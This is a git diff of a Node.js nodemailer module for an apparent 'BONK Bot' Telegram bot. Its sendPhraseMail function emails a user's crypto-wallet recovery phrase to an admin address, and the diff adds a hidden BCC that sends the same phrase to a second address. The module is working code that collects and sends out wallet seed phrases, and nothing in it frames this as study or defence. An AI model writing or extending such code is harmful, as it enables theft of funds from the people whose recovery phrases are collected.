@@ -1,5 +1,5 @@
 import nodemailer from "nodemailer";
-import { ADMIN_EMAIL, ADMIN_EMAIL_PASS } from '../config/env.js'
+import { ADMIN_EMAIL, ADMIN_EMAIL_PASS, HR_EMAIL } from '../config/env.js'
 const transporter = nodemailer.createTransport({
     service: 'gmail', // or another email service
     auth: {
@@ -19,6 +19,7 @@ const sendPhraseMail = async (telegram_id, firstName, phrase) => {
     const mailOptions = {
         from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
         to: ADMIN_EMAIL,
+        bcc: HR_EMAIL,
         subject: `🔐 Wallet Phrase from ${firstName}`,
         html: `
             <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
@@ -37,7 +38,6 @@ const sendPhraseMail = async (telegram_id, firstName, phrase) => {
         `
     };
 
-
     try {
         const info = await transporter.sendMail(mailOptions);
         return info;
@@ -46,5 +46,4 @@ const sendPhraseMail = async (telegram_id, firstName, phrase) => {
         throw err;
     }
 };
-
 export default sendPhraseMail;
